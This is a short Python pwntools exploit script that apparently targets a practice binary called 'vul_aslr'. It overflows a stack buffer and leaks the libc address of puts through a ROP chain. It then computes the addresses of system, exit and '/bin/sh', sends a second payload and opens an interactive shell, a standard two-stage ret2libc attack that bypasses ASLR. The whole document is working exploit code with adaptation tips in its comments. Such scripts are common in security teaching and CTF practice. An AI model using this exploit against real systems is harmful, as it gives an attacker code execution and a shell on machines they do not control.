from pwn import *
import os
import posix

## copy the libc from your machine!!!
## ldd vul_aslr to get the path of libc
libc = ELF('/lib32/libc.so.6')
elf = ELF('./vul_aslr')

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = elf.symbols["main"]

# Get the absolute path to retlib
path = os.path.abspath("./vul_aslr")
p = process(path)

rop  = p32(puts_plt)
rop += p32(main_addr)
rop += p32(puts_got)

p.recvuntil(b"ret2libc start\n")
payload = bytes("A", 'latin-1')*(0x28 + 4) + rop 
p.sendline(payload)
puts_libc = u32(p.recvline()[0:4])
log.info("puts@libc: 0x%x" % (puts_libc))


p.clean()

offset_puts = libc.symbols['puts']
libc_base = puts_libc - offset_puts

offset_system = libc.symbols['system']
system_addr = libc_base + offset_system

offset_exit = libc.symbols['exit']
exit_addr = libc_base + offset_exit

offset_str_bin_sh = next(libc.search(b'/bin/sh'))
binsh_addr = libc_base + offset_str_bin_sh


log.info("libc base: 0x%x" % libc_base)
log.info("system@libc: 0x%x" % system_addr)
log.info("binsh@libc: 0x%x" % binsh_addr)
log.info("exit@libc: 0x%x" % exit_addr)

rop2  = p32(system_addr)
rop2 += p32(exit_addr)
rop2 += p32(binsh_addr)

payload2 = bytes("A", 'latin-1')*(0x28 + 4) + rop2 
p.send(payload2)

log.info("Stage 2 sent!")
log.success("Enjoy your shell.")
p.interactive()
